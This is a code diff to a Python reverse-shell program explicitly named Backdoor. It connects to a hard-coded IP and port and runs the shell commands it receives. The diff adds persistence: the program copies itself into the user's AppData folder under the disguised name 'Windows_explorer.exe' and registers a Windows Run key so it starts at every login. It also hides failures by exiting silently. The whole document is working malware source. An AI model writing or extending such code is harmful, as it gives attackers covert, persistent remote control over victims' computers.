@@ -1,11 +1,20 @@
-import subprocess
-import socket, json, os, base64
+import subprocess, socket, json, os, base64, sys, shutil
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def persistence(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows_explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copy(sys.executable, evil_file_location)
+            subprocess.call(
+                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "{evil_file_location}"',
+                shell=True,
+            )
 
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
@@ -56,5 +65,8 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("192.168.164.128", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("192.168.164.128", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
